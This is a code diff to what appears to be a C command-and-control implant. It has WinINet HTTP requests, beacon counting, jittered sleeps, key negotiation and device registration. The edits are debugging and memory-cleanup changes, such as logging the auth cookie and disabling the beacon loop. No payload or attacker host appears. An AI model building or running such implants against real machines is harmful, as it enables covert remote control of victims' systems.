@@ -119,6 +119,8 @@ void http_request() {
     DWORD buffer_length = 0;
     DWORD available_size = 0;
 
+    CHAR* token;
+
     log_debug("Sending request for %d", data.status);
     beacon.count++;
 
@@ -166,7 +168,7 @@ void http_request() {
 
     process_response:
         if (beacon.count <= 1) {
-            CHAR* token = strtok(response, " ");
+            token = strtok(response, " ");
 
             if (strtok(NULL, " ") == NULL && strlen(response) > 10) {
                 auth.cookie = _strdup(token);
@@ -180,6 +182,8 @@ void http_request() {
     cleanup:
         free(data.buffer);
         free(response);
+        // free(token);
+        free(query_buffer);
         InternetCloseHandle(h_internet);
         InternetCloseHandle(h_connect);
         InternetCloseHandle(h_request);
@@ -294,6 +298,8 @@ void register_device() {
     package(buffer);
 
     log_info("Buffer: %s", buffer); 
+
+    http_request(); 
     
     goto clean_memory;
     clean_memory:
@@ -341,6 +347,7 @@ void negotiate_key(CHAR* keyword) {
 float calculate_jitter(int seconds, int percent) {
     float jitter = (((seconds * percent / 100) + (rand() % ((seconds + (seconds * percent / 100)) + 1))) * 1000);
     log_info("Sleep time: %.6f", jitter);
+    printf("\n-------------------------------------------\n\n");
     return jitter;
 }
 
@@ -372,8 +379,11 @@ int main(int argc, char* argv[]) {
     
     negotiate_key(auth.keyword);
     Sleep(calculate_jitter(3, 30));
+
+    log_info("Auth key: %s", auth.cookie);
+
     register_device();
     Sleep(calculate_jitter(3, 30));
-    agent_beacon();
-    Sleep(calculate_jitter(3, 30));
+    // agent_beacon();
+    // Sleep(calculate_jitter(3, 30));
 }
